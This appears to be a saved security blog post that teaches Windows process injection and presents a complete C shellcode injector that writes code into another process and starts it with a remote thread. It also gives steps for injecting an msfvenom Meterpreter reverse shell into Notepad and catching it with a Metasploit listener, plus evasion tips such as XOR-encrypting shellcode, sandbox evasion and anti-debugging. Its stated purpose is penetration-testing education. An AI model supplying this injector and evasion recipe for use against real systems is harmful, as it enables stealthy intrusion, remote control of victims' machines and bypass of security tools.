filename: c-process-injection-harnessing-the-power-of-shellcode-20250909.txt
https://redfoxsecurity.medium.com/process-injection-harnessing-the-power-of-shellcode-92e45ea72be6

Process Injection: Harnessing the Power of Shellcode
Jul 17, 2025

   et rocess injection is an advanced penetration testing technique used by skilled security professionals
   to stealthily insert malicious code into legitimate processes. This approach enables attackers to
   evade detection, escalate privileges, and persist within a target system.

   Also known as shellcode injection, process injection utilizes several mechanisms to hijack the
   execution flow of trusted processes. In this comprehensive guide, we'll explore the theory behind
   process injection and walk through a practical shellcode injection example.

What is Process Injection?
   Process injection involves injecting code into another process's memory space to make that process
   run the injected code. By doing this, attackers can:
     * Hide malicious activity within trusted system processes.
     * Access and manipulate resources with the victim process's permissions.
     * Escalate privileges and bypass security controls.

Understanding the Building Blocks
   Before diving deeper, let's clarify some core concepts:

Processes
   A process is a running instance of a program. It has:
     * A private virtual address space - the memory the process can access.
     * Handles - references to system resources like files, threads, or other processes.
     * Security tokens - defining permissions, user/group ownership, and privileges.
     * One or more threads - independent execution paths running code within the process.

Virtual Address Space
     * Private memory is exclusive to one process.
     * Shared memory can be mapped between processes.
     * Tools like VMMap visualize these address spaces.

Handles
   Handles are pointers to system resources. Tools such as Process Explorer can show open handles and
   their details.

Security Tokens & Privileges
     * Tokens define a process's security context, including user identity and permissions.
     * Key privileges include SeDebugPrivilege, SeImpersonatePrivilege, and others critical for
       injection success.

Threads
   Threads execute code within the process. Injection often involves creating a new thread that starts
   executing injected code.

Shellcode Injection: The Core Technique
   Shellcode injection is a popular form of process injection. It involves:
    1. Opening a handle to the target process with sufficient permissions.
    2. Allocating memory in the target process.
    3. Writing shellcode (malicious machine code) into this allocated space.
    4. Creating a remote thread to execute the injected shellcode.

Generating Effective Shellcode
   Shellcode is the payload that gets injected and executed.
     * Avoid generic, publicly available shellcode - it's easily detected by security tools.
     * Generate customized shellcode using tools like msfvenom.
     * To evade detection, encrypt your shellcode (e.g., with an XOR cipher) before injection.

Example: Shellcode Injection in C
   Here's a simplified example demonstrating process injection:

#include <windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;              /* ... = 0 !! (unsigned int -> compiler warning) */
LPVOID rBuffer = NULL;              /* OK */
HANDLE hProcess, hThread = NULL;    /* OK */

unsigned char shellcode[] = /* SHELLCODE GOES HERE */;

int main(int argc, char* argv[]) {

	if(argc < 2){
		printf("Usage: program.exe <PID>\n");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if(hProcess == NULL) {
		printf("Failed to open process %ld, error: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if(hThread == NULL){
		printf("Failed to create remote thread, error: %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}

How it works:
     * Opens the target process by PID.
     * Allocates executable memory inside it.
     * Writes shellcode into that memory.
     * Creates a new thread inside the target process starting at the shellcode.
     * Waits for the thread to finish execution.

Running the Injection
    1. Generate shellcode (e.g., a Meterpreter reverse shell) using msfvenom.
    2. Paste the shellcode into the code above and compile.
    3. Launch a legitimate process (e.g., Notepad) and note its PID (tasklist in PowerShell).
    4. Run your injector with the PID as an argument.
    5. Setup a Metasploit listener (exploit/multi/handler) to catch the reverse shell.

Next Steps: Evolve Your Injection Techniques
     * Automate target PID discovery.
     * Request minimal permissions required.
     * Use direct API calls to avoid detection.
     * Implement sandbox evasion and anti-debugging tricks.
     * Encrypt and obfuscate shellcode payloads.

TL;DR
   Process injection is a stealthy technique allowing attackers or penetration testers to insert
   malicious code into legitimate processes, bypassing security controls. Using well-crafted shellcode
   and APIs like OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThreadEx, you can
   execute code within another process context.

   Ethical use is paramount. Use these skills responsibly to strengthen defenses and uncover
   vulnerabilities.


---

